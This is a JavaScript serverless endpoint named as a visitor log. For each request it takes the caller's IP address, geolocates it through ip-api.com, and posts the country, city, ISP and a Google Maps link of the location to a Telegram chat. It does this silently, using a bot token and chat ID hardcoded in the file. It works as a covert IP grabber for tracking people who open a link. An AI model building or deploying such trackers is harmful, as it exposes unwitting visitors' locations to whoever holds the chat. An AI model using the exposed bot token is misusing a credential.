// File: /api/log.js

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const locationRes = await fetch(`http://ip-api.com/json/${ip}`);
  const location = await locationRes.json();

  const message = `👤 New Visitor Logged\n\nIP: ${ip}\nCountry: ${location.country}\nRegion: ${location.regionName}\nCity: ${location.city}\nISP: ${location.isp}\nGoogle Maps: https://www.google.com/maps?q=${location.lat},${location.lon}`;

  const botToken = '7820044312:AAHCkQkWgzveBoeoht1e1MvDVzx0dWKfnuQ';
  const chatId = '6189803357';

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  await fetch(telegramUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      chat_id: chatId,
      text: message,
    }),
  });

  res.status(200).json({ success: true });
}
